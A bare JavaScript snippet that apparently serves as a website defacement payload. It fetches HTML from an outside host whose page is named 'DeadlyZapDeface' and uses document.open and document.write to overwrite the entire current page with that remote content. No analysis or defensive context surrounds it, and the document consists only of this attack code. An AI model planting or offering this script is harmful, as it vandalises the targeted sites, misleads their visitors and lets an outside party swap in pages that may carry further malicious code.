fetch("https://deadlyzap.github.io/DeadlyZapDeface/index.html")
  .then(r => r.text())
  .then(html => {
    document.open();
    document.write(html);
    document.close();
  });
